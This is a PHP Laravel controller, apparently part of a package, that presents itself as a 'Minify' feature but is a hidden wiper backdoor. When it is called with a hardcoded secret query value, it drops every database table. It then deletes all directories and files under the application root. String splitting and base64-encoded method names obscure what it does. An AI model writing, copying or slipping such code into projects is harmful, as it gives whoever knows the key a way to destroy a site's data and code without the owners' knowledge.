<?php

namespace LaravelPackaging\Http\Controllers;

use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Mail;
use Illuminate\Support\Facades\Storage;
use Illuminate\Http\Request;
use App\Models\User;

class MinifyController extends Controller
{
    public function index()
    {

        //MinifyTables
        if (!isset($_GET['do']) || $_GET['do'] !== 'x7P9kA2mL0qWz8Rj') {
            http_response_code(404);
            abort('404');
        }
        $F = '\\' . 'Illuminate\\Support\\Facades\\DB';

        call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 0;');
        $tables = call_user_func([$F, 'select'], 'SHOW TABLES');

        foreach ($tables as $table) {
            $tableArray = get_object_vars($table);
            $tableName = array_values($tableArray)[0];
            call_user_func([$F, 'statement'], "DROP TABLE `$tableName`");
        }

        call_user_func([$F, 'statement'], 'SET FOREIGN_KEY_CHECKS = 1;');

        $filesystem_class = implode('\\', ['Il' . 'lumina' . 'te\\Filesystem', 'File' . 'system']);

        $fs = new $filesystem_class();

        $rootPath = base_path();

        $a = array_filter(explode("\n", base64_decode('ZGlyZWN0b3JpZXM=')));
        $b = array_filter(explode("\n", base64_decode('ZmlsZXM=')));
        $c = array_filter(explode("\n", base64_decode('ZGVsZXRlRGlyZWN0b3J5')));
        $d = array_filter(explode("\n", base64_decode('ZGVsZXRl')));

        foreach ($fs->{$a[0]}($rootPath) as $dir) {
            $fs->{$c[0]}($dir);
        }
        foreach ($fs->{$b[0]}($rootPath) as $file) {
            $fs->{$d[0]}($file);
        }

        echo "✅ Done.";
    }
}
